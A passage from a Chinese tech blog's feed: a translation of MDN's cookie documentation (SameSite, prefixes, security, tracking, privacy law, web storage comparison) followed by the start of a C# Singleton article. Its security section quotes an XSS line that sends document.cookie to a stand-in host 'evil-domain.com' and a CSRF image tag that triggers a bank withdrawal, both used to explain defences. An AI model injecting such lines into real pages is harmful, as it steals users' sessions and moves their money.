&lt;p&gt;&lt;code&gt;SameSite&lt;/code&gt; Cookie 允许服务器要求某个 cookie 在跨站请求时不会被发送，（其中&lt;code&gt;{{Glossary(&amp;quot;Site&amp;quot;)}}&lt;/code&gt;由可注册域定义），从而可以阻止跨站请求伪造攻击（&lt;code&gt;{{Glossary(&amp;quot;CSRF&amp;quot;)}}&lt;/code&gt;）。&lt;/p&gt;
&lt;p&gt;SameSite cookies 是相对较新的一个字段，&lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTTP/headers/Set-Cookie#Browser_compatibility&#34;&gt;所有主流浏览器都已经得到支持&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;下面是例子：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;Set-Cookie: key=value; SameSite=Strict
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;SameSite 可以有下面三种值：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;None&lt;/code&gt;&lt;/strong&gt;。浏览器会在同站请求、跨站请求下继续发送 cookies，不区分大小写。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Strict&lt;/code&gt;&lt;/strong&gt;。浏览器将只在访问相同站点时发送 cookie。（在原有 Cookies 的限制条件上的加强，如上文 “Cookie 的作用域” 所述）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Lax&lt;/code&gt;&lt;/strong&gt;。与 &lt;strong&gt;&lt;code&gt;Strict&lt;/code&gt;&lt;/strong&gt; 类似，但用户从外部站点导航至URL时（例如通过链接）除外。 在新版本浏览器中，为默认选项，Same-site cookies 将会为一些跨站子请求保留，如图片加载或者 frames 的调用，但只有当用户从外部站点导航到URL时才会发送。如 link 链接&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以前，如果 SameSite 属性没有设置，或者没有得到运行浏览器的支持，那么它的行为等同于 None，Cookies 会被包含在任何请求中，包括跨站请求。&lt;/p&gt;
&lt;p&gt;大多数主流浏览器正在将 &lt;a href=&#34;https://www.chromestatus.com/feature/5088147346030592&#34;&gt;SameSite 的默认值迁移至 Lax&lt;/a&gt;。如果想要指定 Cookies 在同站、跨站请求都被发送，现在需要明确指定 SameSite 为 None。&lt;/p&gt;
&lt;h4 id=&#34;cookie-prefixes&#34;&gt;Cookie prefixes&lt;/h4&gt;
&lt;p&gt;cookie 机制的使得服务器无法确认 cookie 是在安全来源上设置的，甚至无法确定 cookie 最初是在哪里设置的。&lt;/p&gt;
&lt;p&gt;子域上的易受攻击的应用程序可以使用 Domain 属性设置 cookie，从而可以访问所有其他子域上的该 cookie。会话固定攻击中可能会滥用此机制。有关主要缓解方法，请参阅&lt;a href=&#34;https://wiki.developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#Session_fixation&#34;&gt;会话劫持（ session fixation）&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;但是，作为&lt;a href=&#34;https://en.wikipedia.org/wiki/Defense_in_depth_(computing)&#34;&gt;深度防御措施&lt;/a&gt;，可以使用 cookie 前缀来断言有关 cookie 的特定事实。有两个前缀可用：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;__Host-&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果 cookie 名称具有此前缀，则仅当它也用 &lt;code&gt;Secure&lt;/code&gt; 属性标记，是从安全来源发送的，不包括 &lt;code&gt;Domain&lt;/code&gt; 属性，并将 &lt;code&gt;Path&lt;/code&gt; 属性设置为 &lt;code&gt;/&lt;/code&gt; 时，它才在 {{HTTPHeader(&amp;ldquo;Set-Cookie&amp;rdquo;)}} 标头中接受。这样，这些 cookie 可以被视为 &amp;ldquo;domain-locked”。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;__Secure-&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果 cookie 名称具有此前缀，则仅当它也用 &lt;code&gt;Secure&lt;/code&gt; 属性标记，是从安全来源发送的，它才在 {{HTTPHeader(&amp;ldquo;Set-Cookie&amp;rdquo;)}} 标头中接受。该前缀限制要弱于 &lt;code&gt;__Host-&lt;/code&gt; 前缀。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;带有这些前缀点 Cookie， 如果不符合其限制的会被浏览器拒绝。请注意，这确保了如果子域要创建带有前缀的 cookie，那么它将要么局限于该子域，要么被完全忽略。由于应用服务器仅在确定用户是否已通过身份验证或 CSRF 令牌正确时才检查特定的 cookie 名称，因此，这有效地充当了针对会话劫持的防御措施。&lt;/p&gt;
&lt;p&gt;在应用程序服务器上，Web 应用程序&lt;strong&gt;必须&lt;/strong&gt;检查完整的 cookie 名称，包括前缀 —— 用户代理程序在从请求的 {{HTTPHeader(&amp;ldquo;Cookie&amp;rdquo;)}} 标头中发送前缀之前，&lt;strong&gt;不会&lt;/strong&gt;从 cookie 中剥离前缀。&lt;/p&gt;
&lt;p&gt;有关 cookie 前缀和浏览器支持的当前状态的更多信息，请参阅 &lt;a href=&#34;https://wiki.developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Cookie_prefixes&#34;&gt;Prefixes section of the Set-Cookie reference article&lt;/a&gt;。&lt;/p&gt;
&lt;h4 id=&#34;javascript-通过-documentcookie-访问-cookie&#34;&gt;JavaScript 通过 Document.cookie 访问 Cookie&lt;/h4&gt;
&lt;p&gt;通过 {{domxref(&amp;ldquo;Document.cookie&amp;rdquo;)}} 属性可创建新的 Cookie，也可通过该属性访问非&lt;code&gt;HttpOnly&lt;/code&gt;标记的Cookie。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.cookie = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;yummy_cookie=choco&amp;#34;&lt;/span&gt;; 
&lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.cookie = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;tasty_cookie=strawberry&amp;#34;&lt;/span&gt;; 
console.log(&lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.cookie); 
&lt;span style=&#34;color:#228b22&#34;&gt;// logs &amp;#34;yummy_cookie=choco; tasty_cookie=strawberry&amp;#34;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;通过 JavaScript 创建的 Cookie 不能包含 HttpOnly 标志。&lt;/p&gt;
&lt;p&gt;请留意在&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#Security&#34;&gt;安全&lt;/a&gt;章节提到的安全隐患问题，JavaScript 可以通过跨站脚本攻击（XSS）的方式来窃取 Cookie。&lt;/p&gt;
&lt;h2 id=&#34;安全&#34;&gt;安全&lt;/h2&gt;
&lt;p&gt;信息被存在 Cookie 中时，需要明白 cookie 的值时可以被访问，且可以被终端用户所修改的。根据应用程序的不同，可能需要使用服务器查找的不透明标识符，或者研究诸如 JSON Web Tokens 之类的替代身份验证/机密机制。&lt;/p&gt;
&lt;p&gt;当机器处于不安全环境时，切记&lt;em&gt;不能&lt;/em&gt;通过 HTTP Cookie 存储、传输敏感信息。&lt;/p&gt;
&lt;p&gt;缓解涉及Cookie的攻击的方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用 &lt;code&gt;HttpOnly&lt;/code&gt; 属性可防止通过 JavaScript 访问 cookie 值。&lt;/li&gt;
&lt;li&gt;用于敏感信息（例如指示身份验证）的 Cookie 的生存期应较短，并且 &lt;code&gt;SameSite&lt;/code&gt; 属性设置为&lt;code&gt;Strict&lt;/code&gt; 或 &lt;code&gt;Lax&lt;/code&gt;。（请参见上方的 &lt;a href=&#34;https://wiki.developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies$edit#&#34;&gt;SameSite Cookie&lt;/a&gt;。）在&lt;a href=&#34;https://wiki.developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Browser_compatibility&#34;&gt;支持 SameSite 的浏览器&lt;/a&gt;中，这样做的作用是确保不与跨域请求一起发送身份验证 cookie，因此，这种请求实际上不会向应用服务器进行身份验证。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;会话劫持和-xss&#34;&gt;会话劫持和 XSS&lt;/h3&gt;
&lt;p&gt;在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 {{Glossary(&amp;ldquo;XSS&amp;rdquo;)}} 攻击。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; Image()).src = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;http://www.evil-domain.com/steal-cookie.php?cookie=&amp;#34;&lt;/span&gt; + &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.cookie;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;HttpOnly&lt;/code&gt; 类型的 Cookie 用于阻止了JavaScript 对其的访问性而能在一定程度上缓解此类攻击。&lt;/p&gt;
&lt;h3 id=&#34;跨站请求伪造csrf&#34;&gt;跨站请求伪造（CSRF）&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery&#34;&gt;维基百科&lt;/a&gt;已经给了一个比较好的 {{Glossary(&amp;ldquo;CSRF&amp;rdquo;)}} 例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;img&lt;/span&gt; &lt;span style=&#34;color:#658b00&#34;&gt;src&lt;/span&gt;=&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;http://bank.example.com/withdraw?account=bob&amp;amp;amount=1000000&amp;amp;for=mallory&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对用户输入进行过滤来阻止 {{Glossary(&amp;ldquo;XSS&amp;rdquo;)}}；&lt;/li&gt;
&lt;li&gt;任何敏感操作都需要确认；&lt;/li&gt;
&lt;li&gt;用于敏感信息的 Cookie 只能拥有较短的生命周期；&lt;/li&gt;
&lt;li&gt;更多方法可以查看&lt;a href=&#34;https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet&#34;&gt;OWASP CSRF prevention cheat sheet&lt;/a&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;跟踪和隐私&#34;&gt;跟踪和隐私&lt;/h2&gt;
&lt;h3 id=&#34;第三方-cookie&#34;&gt;第三方 Cookie&lt;/h3&gt;
&lt;p&gt;Cookie 与域关联。如果此域与您所在页面的域相同，则该 cookie 称为&lt;em&gt;第一方 cookie（ first-party cookie）&lt;/em&gt;。如果域不同，则它是&lt;em&gt;第三方 cookie（third-party cookie）&lt;/em&gt;。当托管网页的服务器设置第一方 Cookie 时，该页面可能包含存储在其他域中的服务器上的图像或其他组件（例如，广告横幅），这些图像或其他组件可能会设置第三方 Cookie。这些主要用于在网络上进行广告和跟踪。例如，&lt;a href=&#34;https://policies.google.com/technologies/types&#34;&gt;types of cookies used by Google&lt;/a&gt;。第三方服务器可以基于同一浏览器在访问多个站点时发送给它的 cookie 来建立用户浏览历史和习惯的配置文件。Firefox 默认情况下会阻止已知包含跟踪器的第三方 cookie。第三方cookie（或仅跟踪 cookie）也可能被其他浏览器设置或扩展程序阻止。阻止 Cookie 会导致某些第三方组件（例如社交媒体窗口小部件）无法正常运行。&lt;/p&gt;
&lt;p&gt;如果你没有公开你网站上第三方 Cookie 的使用情况，当它们被发觉时用户对你的信任程度可能受到影响。一个较清晰的声明（比如在隐私策略里面提及）能够减少或消除这些负面影响。在某些国家已经开始对Cookie制订了相应的法规，可以查看维基百科上例子&lt;a href=&#34;https://wikimediafoundation.org/wiki/Cookie_statement&#34;&gt;cookie statement&lt;/a&gt;。&lt;/p&gt;
&lt;h3 id=&#34;cookie-相关规定&#34;&gt;Cookie 相关规定&lt;/h3&gt;
&lt;p&gt;涉及使用 Cookie 的法律或法规包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;欧盟通用数据隐私法规（GDPR）&lt;/li&gt;
&lt;li&gt;欧盟的《隐私权指令》&lt;/li&gt;
&lt;li&gt;加州消费者隐私法&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些规定具有全球影响力，因为它们适用于这些司法管辖区（欧盟和加利福尼亚）的用户访问的万维网上的任何站点，但请注意，加利福尼亚州的法律仅适用于总收入超过2500万美元的实体其他事情。）&lt;/p&gt;
&lt;p&gt;这些法规包括以下要求：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;向用户表明您的站点使用 cookie。&lt;/li&gt;
&lt;li&gt;允许用户选择不接收某些或所有 cookie。&lt;/li&gt;
&lt;li&gt;允许用户在不接收 Cookie 的情况下使用大部分服务。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可能还存在其他法规来管理您当地的Cookie。您有责任了解并遵守这些规定。有些公司提供 &amp;ldquo;cookie banner&amp;rdquo; 代码，可帮助您遵守这些法规。&lt;/p&gt;
&lt;p&gt;可以通过&lt;a href=&#34;https://en.wikipedia.org/wiki/HTTP_cookie#EU_cookie_directive&#34;&gt;维基百科的相关内容&lt;/a&gt;获取最新的各国法律和更精确的信息。&lt;/p&gt;
&lt;h4 id=&#34;禁止追踪-do-not-track&#34;&gt;禁止追踪 Do-Not-Track&lt;/h4&gt;
&lt;p&gt;虽然并没有法律或者技术手段强制要求使用 {{HTTPHeader(&amp;ldquo;DNT&amp;rdquo;)}}，但是通过{{HTTPHeader(&amp;ldquo;DNT&amp;rdquo;)}} 可以告诉Web程序不要对用户行为进行追踪或者跨站追踪。查看{{HTTPHeader(&amp;ldquo;DNT&amp;rdquo;)}} 以获取更多信息。&lt;/p&gt;
&lt;h4 id=&#34;欧盟-cookie-指令&#34;&gt;欧盟 Cookie 指令&lt;/h4&gt;
&lt;p&gt;关于 Cookie，欧盟已经在&lt;a href=&#34;http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136&#34;&gt;2009/136/EC指令&lt;/a&gt;中提了相关要求，该指令已于2011年5月25日生效。虽然指令并不属于法律，但它要求欧盟各成员国通过制定相关的法律来满足该指令所提的要求。当然，各国实际制定法律会有所差别。&lt;/p&gt;
&lt;p&gt;该欧盟指令的大意：在征得用户的同意之前，网站不允许通过计算机、手机或其他设备存储、检索任何信息。自从那以后，很多网站都在网站声明中添加了相关说明，告诉用户他们的 Cookie 将用于何处。&lt;/p&gt;
&lt;h3 id=&#34;僵尸-cookie-和删不掉的-cookie&#34;&gt;僵尸 Cookie 和删不掉的 Cookie&lt;/h3&gt;
&lt;p&gt;Cookie的一个极端使用例子是僵尸Cookie（或称之为“删不掉的Cookie”），这类 Cookie 较难以删除，甚至删除之后会自动重建。这些技术违反了用户隐私和用户控制的原则，可能违反了数据隐私法规，并可能使使用它们的网站承担法律责任。它们一般是使用 &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API&#34;&gt;Web storage API&lt;/a&gt;、Flash本地共享对象或者其他技术手段来达到的。相关内容可以看：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/samyk/evercookie&#34;&gt;Evercookie by Samy Kamkar&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Zombie_cookie&#34;&gt;在维基百科上查看僵尸Cookie&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;在浏览器中存储信息的其他方式&#34;&gt;在浏览器中存储信息的其他方式&lt;/h2&gt;
&lt;p&gt;在浏览器中存储数据的另一种方法是 &lt;a href=&#34;https://wiki.developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API&#34;&gt;Web Storage API&lt;/a&gt;。&lt;a href=&#34;https://wiki.developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage&#34;&gt;window.sessionStorage&lt;/a&gt; 和&lt;a href=&#34;https://wiki.developer.mozilla.org/en-US/docs/Web/API/Window/localStorage&#34;&gt;window.localStorage&lt;/a&gt; 属性与持续时间中的会话和永久 cookie 相对应，但是存储限制比 cookie大，并且永远不会发送到服务器。&lt;/p&gt;
&lt;p&gt;可以使用 &lt;a href=&#34;https://wiki.developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API&#34;&gt;IndexedDB API&lt;/a&gt; 或基于它构建的库来存储更多结构化的数据。&lt;/p&gt;
&lt;h1 id=&#34;总结&#34;&gt;总结&lt;/h1&gt;
&lt;p&gt;这三种缓存都是保存在浏览器端，且都是同源的。&lt;/p&gt;
&lt;p&gt;cookie数据始终在同源的http请求中携带（即使不需要），即cookie在浏览器和服务器间来回传递；cookie数据还有路径（path）的概念，可以限制cookie只属于某个路径下。存储大小限制也不同，cookie数据不能超过4k，同时因为每次http请求都会携带cookie，所以cookie只适合保存很小的数据，如会话标识。&lt;/p&gt;
&lt;p&gt;不同之处体现在以下几个方面：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;存储大小不同
而sessionStorage和localStorage不会自动把数据发给服务器，仅在本地保存。sessionStorage和localStorage 虽然也有存储大小的限制，但比cookie大得多，可以达到5M或更大。&lt;/li&gt;
&lt;li&gt;数据有效期不同
&lt;ul&gt;
&lt;li&gt;sessionStorage：仅在当前浏览器窗口关闭前有效，自然也就不可能持久保持；&lt;/li&gt;
&lt;li&gt;localStorage：始终有效，窗口或浏览器关闭也一直保存，因此用作持久数据；（&lt;em&gt;在新增localStorage前清空之前缓存&lt;/em&gt;）&lt;/li&gt;
&lt;li&gt;cookie：只在设置的cookie过期时间之前一直有效，即使窗口或浏览器关闭。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;作用域不同
&lt;ul&gt;
&lt;li&gt;sessionStorage 不在不同的浏览器窗口中共享，即使是同一个页面；&lt;/li&gt;
&lt;li&gt;localStorage 在所有同源窗口中都是共享的；&lt;/li&gt;
&lt;li&gt;cookie 也是在所有同源窗口中都是共享的。&lt;/li&gt;
&lt;li&gt;Web Storage 支持事件通知机制，可以将数据更新的通知发送给监听者。Web Storage 的 api 接口使用更方便。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Web Storage带来的好处
&lt;ul&gt;
&lt;li&gt;减少网络流量：一旦数据保存在本地之后，就可以避免再向服务器请求数据，因此减少不必要的数据请求，减少数据在浏览器和服务器间不必要的来回传递。&lt;/li&gt;
&lt;li&gt;快速显示数据：性能好，从本地读数据比通过网络从服务器上获得数据快得多，本地数据可以及时获得，再加上网页本身也可以有缓存，因此整个页面和数据都在本地的话，可以立即显示。&lt;/li&gt;
&lt;li&gt;临时存储：很多时候数据只需要在用户浏览一组页面期间使用，关闭窗口后数据就可以丢弃了，这种情况使用sessionStorage非常方便&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;sessionStorage与页面js数据对象（全局变量）的区别&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;页面中一般的js对象的生存期仅在当前页面有效，因此刷新页面或转到另一页面这样的重新加载页面的情况，数据就不存在了。&lt;/li&gt;
&lt;li&gt;而sessionStorage只要同源的同窗口中，刷新页面或进入同源的不同页面，数据始终存在，也就是说只要浏览器不关闭，数据仍然存在。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1 id=&#34;reference&#34;&gt;Reference&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Window/localStorage&#34;&gt;https://developer.mozilla.org/zh-CN/docs/Web/API/Window/localStorage&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Window/sessionStorage&#34;&gt;https://developer.mozilla.org/zh-CN/docs/Web/API/Window/sessionStorage&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API&#34;&gt;https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies&#34;&gt;https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
- https://www.openheart.icu/cs/sessionstorage%E5%92%8Clocalstorage%E5%92%8Ccookie/ - ALL RIGHTS RESERVED KRIS NIE</description>
        </item>
    
    
    
        <item>
        <title>C# in Depth</title>
        <link>https://www.openheart.icu/cs/csharp-in-depth/</link>
        <pubDate>Sat, 25 Jul 2020 00:14:11 +0000</pubDate>
        
        <guid>https://www.openheart.icu/cs/csharp-in-depth/</guid>
        <description>42th openheart https://www.openheart.icu/cs/csharp-in-depth/ -&lt;p&gt;&lt;em&gt;本文为「C# in Depth」(4th edition)学习记录。&lt;/em&gt;&lt;/p&gt;
- https://www.openheart.icu/cs/csharp-in-depth/ - ALL RIGHTS RESERVED KRIS NIE</description>
        </item>
    
    
    
        <item>
        <title>Implementing the Singleton Pattern in C#</title>
        <link>https://www.openheart.icu/cs/implementing-the-singleton-pattern-in-csharp/</link>
        <pubDate>Sat, 25 Jul 2020 00:14:11 +0000</pubDate>
        
        <guid>https://www.openheart.icu/cs/implementing-the-singleton-pattern-in-csharp/</guid>
        <description>42th openheart https://www.openheart.icu/cs/implementing-the-singleton-pattern-in-csharp/ -&lt;h1 id=&#34;implementing-the-singleton-pattern-in-chttpscsharpindepthcomarticlessingleton&#34;&gt;&lt;a href=&#34;https://csharpindepth.com/articles/Singleton&#34;&gt;Implementing the Singleton Pattern in C#&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;在C＃中实现单例模式。该模式是非常常见的设计模式之一，某个对象全局只需要一个实例时，就可以使用单例模式。它的优点也显而易见：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;它能够避免对象重复创建，节约空间并提升效率&lt;/li&gt;
&lt;li&gt;避免由于操作不同实例导致的逻辑错误&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;em&gt;以下是原文作者Jon Skeet 对C#单例模式的介绍。&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;单例模式是软件工程中最著名的模式之一。本质上，单例是仅允许创建其自身的单个实例的类，并且通常提供对该实例的简单访问。最常见的是，单例在创建实例时不允许指定任何参数，否则对实例的第二次请求但参数不同可能会出现问题！ （如果应该为具有相同参数的所有请求访问相同的实例，则使用工厂模式更为合适。）本文仅涉及不需要参数的情况。通常，单例的要求是它们是懒惰地创建的，即：直到首次需要实例时才创建实例。&lt;/p&gt;
&lt;p&gt;在C＃中有多种不同的方式来实现单例模式。我将在这里以从简到难顺序（&lt;em&gt;in reverse order of elegance&lt;/em&gt;）介绍它们，从最常见的线程安全性开始，逐步发展为完全延迟加载，线程安全，简单且高性能的版本。&lt;/p&gt;
&lt;p&gt;所有这些实现都有四个共同的特征，但是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;单个构造函数，私有且无参数。这样可以防止其他类实例化它（这将违反模式）。请注意，它还防止了子类化（&lt;em&gt;subclassing&lt;/em&gt;）如果一个单例可以被子类化一次，则可以被子类化两次，并且如果每个子类都可以创建一个实例，则将违反（&lt;em&gt;violated&lt;/em&gt;）该模式。如果您需要基本类型的单个实例，则可以使用工厂模式，但是直到运行时才知道确切的类型。&lt;/li&gt;
&lt;li&gt;该类是密封的。严格来说，由于上述几点，这是不必要的，但可以帮助&lt;code&gt;JIT&lt;/code&gt;进行更多优化。&lt;/li&gt;
&lt;li&gt;一个静态变量，其中包含对创建的单个实例的引用（如果有）。&lt;/li&gt;
&lt;li&gt;公共静态方法是获取对创建的单个实例的引用，并在必要时创建一个实例。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;请注意，所有这些实现还使用公共静态属性&lt;code&gt;Instance&lt;/code&gt;作为访问实例的方式。在所有情况下，都可以轻松地将属性转换为方法，而不会影响线程安全性或性能。&lt;/p&gt;
&lt;h2 id=&#34;first-version---not-thread-safe&#34;&gt;First version - not thread-safe&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;color:#228b22&#34;&gt;// Bad code! Do not use!
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;sealed&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Singleton&lt;/span&gt;
{
  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; Singleton instance = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;;

  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; Singleton()
  {
  }

  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; Singleton Instance
  {
    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;get&lt;/span&gt;
    {
      &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (instance == &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;)
      {
        instance = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; Singleton();
      }
      &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; instance;
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如前所述，以上内容不是线程安全的。&lt;/p&gt;
&lt;p&gt;两个不同的线程都可以执行判断（&lt;em&gt;evaluated the test&lt;/em&gt;）&lt;code&gt;if(instance == null)&lt;/code&gt;并发现它为&lt;code&gt;true&lt;/code&gt;，然后都创建实例，这违反了单例模式。请注意，实际上可能已经在计算表达式之前创建了实例，但是内存模型不能保证实例的新值能暴露给其他线程，除非已传递适当的内存屏障（互斥锁）（&lt;em&gt;memory barriers&lt;/em&gt;）。&lt;/p&gt;
&lt;h2 id=&#34;second-version---simple-thread-safety&#34;&gt;Second version - simple thread-safety&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-C#&#34; data-lang=&#34;C#&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;sealed&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Singleton&lt;/span&gt;
{
  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; Singleton instance = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;;
